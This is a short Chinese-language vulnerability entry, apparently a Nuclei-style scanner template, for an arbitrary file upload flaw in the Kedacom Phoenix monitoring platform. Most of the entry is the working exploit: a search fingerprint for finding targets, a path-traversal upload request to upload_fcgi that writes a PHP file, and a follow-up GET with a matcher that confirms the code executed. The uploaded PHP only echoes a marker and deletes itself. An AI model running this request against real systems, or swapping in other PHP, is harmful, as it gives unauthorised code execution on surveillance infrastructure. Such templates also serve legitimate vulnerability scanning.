# Kedacom-Phoenix-监控平台upload-fcgi任意文件上传

- **系统**：Kedacom　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/pmc_web/lib/jj172.js"`
- **请求**：`POST /pmc-bin/upload_fcgi?uploadDir=../&uploadName={{filename}}.php HTTP/1.1`
- **关键头**：`id: Kedacom-Phoenix-upload_fcgi`　`name: Kedacom-Phoenix-upload_fcgi`　`author: SS`　`severity: high`　`filename: "{{to_lower(rand_base(10))}}"`　`boundary: "{{to_lower(rand_base(20))}}"`

**请求体 / payload**
```
- raw:
-
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----{{boundary}}
----{{boundary}}
Content-Disposition: form-data; name="Filedata"; filename="{{filename}}"
Content-Type: application/octet-stream
<?php echo "{{randstr}}";unlink(__FILE__);?>
----{{boundary}}--
-
GET /{{filename}}.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----{{boundary}}
matchers:
- type: dsl
dsl:
- status_code==200 && contains_all(body,"{{randstr}}")
```
- **预期**：200　|　—